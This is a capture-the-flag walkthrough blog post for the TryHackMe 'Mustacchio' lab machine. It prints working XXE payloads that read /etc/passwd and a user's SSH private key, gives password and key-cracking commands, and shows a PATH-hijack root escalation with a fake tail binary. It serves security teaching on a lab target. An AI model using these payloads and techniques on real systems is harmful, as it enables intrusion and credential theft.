<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/tryhackme/" rel="category tag">TryHackME</a></span>            </div>
            <h1 class="post-title entry-title">Mustacchio TryHackMe Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/mustacchio-tryhackme-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-07-03T07:38:23+00:00">July 3, 2021</time><time class="updated" datetime="2025-06-25T09:28:19+00:00">June 25, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today it is time to solve another challenge called “Mustacchio”. It was created by <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://tryhackme.com/p/zyeinn">zyeinn</a></strong></span>. It is available at TryHackMe for penetration testing practice. The challenge is an easy difficulty if you have the right basic knowledge and are attentive to little details that are required in the enumeration process. The breakdown of the Machine with redacted flags is as follow:</span></p>
<p><span style="color: #000000;"><strong>Level: Easy</strong></span></p>
<h3><span style="color: #800000;">Penetration Testing Methodology</span></h3>
<ul>
<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
<ul>
<li><span style="color: #000000;">Nmap Scan</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Enumeration</strong></span>
<ul>
<li><span style="color: #000000;">Enumerating HTTP Service</span></li>
<li><span style="color: #000000;">Directory Bruteforce using dirb</span></li>
<li><span style="color: #000000;">Enumerating database file</span></li>
<li><span style="color: #000000;">Cracking the password using John the Ripper</span></li>
<li><span style="color: #000000;">Enumerating Source Code</span></li>
<li><span style="color: #000000;">Enumerating Backup file</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Exploitation</strong></span>
<ul>
<li><span style="color: #000000;">Testing XXE Vulnerability</span></li>
<li><span style="color: #000000;">Extracting Private key using XXE</span></li>
<li><span style="color: #000000;">Deciphering the key using John the Ripper</span></li>
<li><span style="color: #000000;">Logging in SSH as Barry user</span></li>
<li><span style="color: #000000;">Reading User Flag</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
<ul>
<li><span style="color: #000000;">Enumerating SUID Permissions</span></li>
<li><span style="color: #000000;">Exploiting Path Variable on the tail</span></li>
<li><span style="color: #000000;">Getting Root Shell</span></li>
<li><span style="color: #000000;">Reading Root Flag</span></li>
</ul>
</li>
</ul>
<p><span style="color: #000000;"><strong>Walkthrough</strong></span></p>
<p><span style="color: #000000;">There are two flags in this machine to discover. After Booting up the target machine from the <a style="color: #000000;" href="https://tryhackme.com/room/mustacchio">TryHackMe: Mustacchio Page,</a> an IP will be assigned to the machine and will be visible on that page as well.</span></p>
<p><span style="color: #000000;"><strong>IP Address: 10.10.74.246</strong></span></p>
<h3><span style="color: #800000;">Network Scanning</span></h3>
<p><span style="color: #000000;">We will start a Nmap scan with the -sV for performing a Version Scan and -sC for default scripts on the target machine.            </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sC -sV  10.10.74.246</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jHDWN57Lr6k/YOAO0g-xqpI/AAAAAAAAxQU/Jq9ARBLnFOEnQHj9TZA7nVK5ooLM-RLsQCLcBGAsYHQ/s16000/1.png"/></span></p>
<p><span style="color: #000000;">We have two services running on the target machine. Then, we have 22 (SSH) and 80 (HTTP). Since we don’t have the credentials for accessing the SSH service at this moment we will be our enumeration with the HTTP Service.</span></p>
<h3><span style="color: #800000;">Enumeration</span></h3>
<p><span style="color: #000000;">To enumerate the HTTP service, we open the IP address of the target machine in the Web Browser and found a Web page. It was mostly a template. There was not much to go on from. Speaking of the HTTP service, we tried to perform multiple formats of the Nmap scan and found that there is another HTTP service running on port 8765.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.74.246</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-seNV2hLMu3Y/YOAO_MrAbGI/AAAAAAAAxQY/dznr_COowKQYE7pFxus6pv-N5qJNws05ACLcBGAsYHQ/s16000/2.png"/></span></p>
<p><span style="color: #000000;">Enumerating another HTTP Service running on port 8765 we can see that it is an authentication panel. We tried to log in using some default credentials but were unsuccessful.</span></p>
<p><span style="color: #000000;"><strong>http://10.10.74.246:8765</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-KqpYg6usLDo/YOAPDdBFw0I/AAAAAAAAxQc/mC0fkHw4xmY-Lc6oCE1EKv8VNmGSwdMMgCLcBGAsYHQ/s16000/3.png"/></span></p>
<p><span style="color: #000000;">Unable to gather any information from the two web pages, we thought to try enumerating the web directories by performing a Directory Bruteforce. We used the dirb tool for this task. After running for a while, we found a directory by the name of custom.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb http://10.10.74.246</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2nbPt3lGQSo/YOAPHTEV4AI/AAAAAAAAxQk/rtPFr1ZCNo40xj60TgmAsgwYkR5AGhJdACLcBGAsYHQ/s16000/4.png"/></span></p>
<p><span style="color: #000000;">Browsing the custom directory, we found two other directories. One was the CSS directory. It contained various style files that are required to format the web pages. There was nothing much to go on from them. We went back to the custom directory and decided to enumerate the js directory.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.74.246/custom</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Gs36699lCQU/YOAPLE2YZoI/AAAAAAAAxQo/dhEbouwmMSYvWXgORK5SdTpynCGZ49vRQCLcBGAsYHQ/s16000/5.png"/></span></p>
<p><span style="color: #000000;">Inside this directory, we found a JavaScript file by the name of mobile.js. It didn’t contain anything useful. We tried to open the users.bak file and found that it is a database file. To explore it we need to take a closer look.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.74.246/custom/js</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5evL8pYa2b8/YOAPO4RNtvI/AAAAAAAAxQw/JakJWWvQIKkFGuBOcNLIZDSU52nJlBtbQCLcBGAsYHQ/s16000/6.png"/></span></p>
<h4><span style="color: #000000;">Database Analysis and Password Cracking</span></h4>
<p><span style="color: #000000;">To enumerate the users.bak file, we downloaded it to our local machine using the wget command. Since it was a database file, we decided to use the SQLite browser to look for the tables and entries that might be stored inside this database file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget http://10.10.74.246/custom/js/users.bak
sqlitebrowser users.bak</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-i-f_kAGqfKk/YOAPUdI4EjI/AAAAAAAAxQ0/8uK340But1gGTNSCkDQ9GzlXLAEb97jJwCLcBGAsYHQ/s16000/7.png"/></span></p>
<p><span style="color: #000000;">We found encrypted credentials for the user admin in the database file. Here, we selected the Browse Data tab inside SQL Lite Browser.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ilbQdlBvquI/YOAPX231HGI/AAAAAAAAxQ4/xQbeiqIWMt4Zu9tHGLCoVTTLo1wosOJBgCLcBGAsYHQ/s16000/8.png"/></span></p>
<p><span style="color: #000000;">We created a file and saved the encrypted password for the user admin. This encryption may be SHA1 due to the length of the text. We used the john the ripper with the rockyou wordlist and the raw-sha1 format. Then we were able to decrypt the password as bulldog19.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano file
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha1 file</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4_Y-6_j_OUI/YOAPbKuHQEI/AAAAAAAAxRA/3Y800X0WQjIe4rozwrXjPTyVNwbe1tJ3wCLcBGAsYHQ/s16000/9.png"/></span></p>
<h4><span style="color: #000000;">Admin Panel Access and XML Analysis</span></h4>
<p><span style="color: #000000;">We tried to log in as SSH using these credentials but we were unsuccessful. That means that these credentials must belong to the authentication page that we found earlier. Upon entering the password, we found the Admin Panel. Here, we found a Text field that is supposed to accept the comment for the website.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.74.246:8765
admin
bulldog19
http://10.10.74.246:8765/home.php</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ayJ8ZARoUtg/YOAPfqr-iuI/AAAAAAAAxRE/ckQ4mzY_P7UEDyy3Uifv2w26qd9scvl2ACLcBGAsYHQ/s16000/10.png"/></span></p>
<p><span style="color: #000000;">We checked the source code of this page to find the work or any hidden comments. We found two comments in the source code of this page. The first one hinted at another backup file inside the auth directory. It was named dontforget.bak. Another comment mentions the user Barry and it also hints that the user Barry can log in on SSH with the help of his key. This means that we need to locate the key for the user Barry.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">source:http://10.10.74.246:8765/home.php</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-lPGgUKHrxmk/YOAPjVJOAdI/AAAAAAAAxRI/1Urn7jJRcXEfewXJ2fmNkKkEfOcSoQTXQCLcBGAsYHQ/s16000/11.png"/></span></p>
<p><span style="color: #000000;">Using the hint that was provided, we wanted to take a closer look at the backup file by the name of dontforget.bak. We used the wget command to download the file to our local machine. We used the file command to find out the type of this file and found that it is an XML file. Based on the assessment of the adding command mechanism that we found earlier and the contents of this file it is clear that the web application accepts the XML input and this is an example of the comment that can be sent to the web application. With the help of this file, we can be certain that there are 3 entities of the XML that are accepted by the application. This includes the &lt;name&gt;, &lt;author&gt; and &lt;com&gt;.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget http://10.10.74.246:8765/auth/dontforget.bak
file dontforget.bak
cat dontforget.bak</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--X1WDcwIOG8/YOAPn9IQB_I/AAAAAAAAxRU/LUJCHVVUihAmqv90l_tgkkXRaEdyWJzFQCLcBGAsYHQ/s16000/12.png"/></span></p>
<h3><span style="color: #800000;">Exploitation</span></h3>
<p><span style="color: #000000;">We twerked the XML file that we were enumerating, and since the web application accepts the XML as input, we had suspicions if the application was vulnerable to XXE. Therefore, we used the structure of the XML file and introduced the external entity name and pointed it towards the /etc/passwd file. Subsequently, we added the reference of the name entity inside the <code data-start="480" data-end="488">&lt;name&gt;</code> as demonstrated in the image below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE data [
   &lt;!ELEMENT data ANY &gt;
   &lt;!ENTITY name SYSTEM "file:///etc/passwd" &gt;]&gt;
&lt;comment&gt;
  &lt;name&gt;&amp;name;&lt;/name&gt;
  &lt;author&gt;Pavandeep&lt;/author&gt;
  &lt;com&gt;Hacking Articles&lt;/com&gt;
&lt;/comment&gt;</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cCszt4mhphw/YOAPsigx8jI/AAAAAAAAxRY/1LOFxr-rG6MlZN9FsEz9T6J89ZjxMonlwCLcBGAsYHQ/s16000/13.png"/></span></p>
<p><span style="color: #000000;">When we hit the submit button, the XXE attack worked and we were able to read the contents of the /etc/passwd file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kingMGryiZI/YOAPw9OZKII/AAAAAAAAxRg/I1uzkyQDvjkf4A8RDTRLwfkth2K6lHx1wCLcBGAsYHQ/s16000/14.png"/></span></p>
<p><span style="color: #000000;">Based on the hint that we discovered in the comments of this page, we know that user Barry is able to login using the SSH key. By default, the key will be located inside the home directory of barry inside the .ssh directory. Using the XXE vulnerability, we tried to get the id_rsa key for the barry user.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE data [
   &lt;!ELEMENT data ANY &gt;
   &lt;!ENTITY name SYSTEM "file:///home/barry/.ssh/id_rsa" &gt;]&gt;
&lt;comment&gt;
  &lt;name&gt;&amp;name;&lt;/name&gt;
  &lt;author&gt;Pavandeep&lt;/author&gt;
  &lt;com&gt;Hacking Articles&lt;/com&gt;
&lt;/comment&gt;</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-sb_zPMb71fQ/YOAQCxDRSMI/AAAAAAAAxR0/SHm6jcwai2s2s-_Ui5Z5v9b3hPkuXqsqgCLcBGAsYHQ/s16000/15.png"/></span></p>
<p><span style="color: #000000;">Our trial was successful. We were able to locate the Private key for the user Barry. To prevent changing the formatting web browser the source code of the page and then copied the private key.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xbcI4G7Me2M/YOAQHqbvh3I/AAAAAAAAxR8/lhMhqLVuhfY9vQpo6z4ryqFwbHNRQFW7QCLcBGAsYHQ/s16000/16.png"/></span></p>
<p><span style="color: #000000;">We saved the contents of the private key into a file named key. Since the key was encrypted and will ask for a password if tried to log in directly, we used the ssh2john.py file to convert the contents of the key into to crackable hash. Learn More about ssh2john <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/beginners-guide-for-john-the-ripper-part-2/">here</a></strong></span>.  Again, we used john the ripper to crack the hash with the rockyou wordlist. We were able to crack the password for the key to be urieljames.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano key
/usr/share/john/ssh2john.py key &gt; hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-MIV6R3rr2HE/YOAQM5mPBsI/AAAAAAAAxSA/XCArw70AFK0VtaH7ydi6DM_Bg4T1p88zACLcBGAsYHQ/s16000/17.png"/></span></p>
<p><span style="color: #000000;">Since we need to connect to SSH using the key, we need to modify the permissions otherwise it will be rejected as a key. We used the key to log in as the Barry user. We found the user flag inside the Barry user’s home directory.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">chmod 600 key
ssh barry@10.10.74.246 -i key
urieljames
cat user.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-EhFn6qFVFsk/YOAQQvhby6I/AAAAAAAAxSE/bCybk7OGxHca4LIQx-nZNn0Gr9gqZjYYwCLcBGAsYHQ/s16000/18.png"/></span></p>
<h3><span style="color: #800000;">Privilege Escalation</span></h3>
<p><span style="color: #000000;">Since we have exploited the machine, it’s time to elevate the current privileges and get the root user access. We start by enumerating the SUID permission using the find command. We found a file inside the home directory of joe user by the name of live_log. Checking the permission for the file, we found that root owns it and we can use this file to elevate our access.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">find / -perm -u=s -type f 2&gt;/dev/null
ls -la /home/joe/</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zYaqNb_DEAY/YOAQUs6wQfI/AAAAAAAAxSM/zdfbAPE2lHUWlmtsE0MhuoiKqwOIm4C6gCLcBGAsYHQ/s16000/19.png"/></span></p>
<p><span style="color: #000000;">Since we will be able to execute the live_log file, we used the strings command to take a closer look at this binary file. Then, we found that this binary file runs the tail command without using its absolute path. This means that we will be able to exploit it by creating our version of the tail command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">strings /home/joe/live_log</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ULN3lB4sq0A/YOAQYv_mqWI/AAAAAAAAxSU/RxKifX2Hw6UgrVVHEoYe0NKJpPSvHBIwwCLcBGAsYHQ/s16000/20.png"/></span></p>
<p><span style="color: #000000;">We moved to the tmp directory since we will have the write and execute permissions. Subsequently, we created our version of the tail command but made it in such a way that it invokes the bash. Then, we changed the permissions to allow us to execute the file. Next, we need to export the path so that when the live_log executes it, our version of the tail runs instead of the original tail. Finally, we executed the live_log file as Barry and gained root access. We read the root flag in the home directory of the root user.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /tmp
echo "/bin/bash" &gt; tail
chmod 777 tail
export PATH=/tmp:$PATH
/home/joe/live_log
cd /root
cat root.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-SFSWcV5bVY4/YOARzulg19I/AAAAAAAAxSs/-eMSbyuBf5YJxHbfw6aLJ9lm3hCYY0LlgCLcBGAsYHQ/s16000/21.png"/></span></p>
<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Contact on <span style="color: #0000ff;"><strong>Twitter</strong> </span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
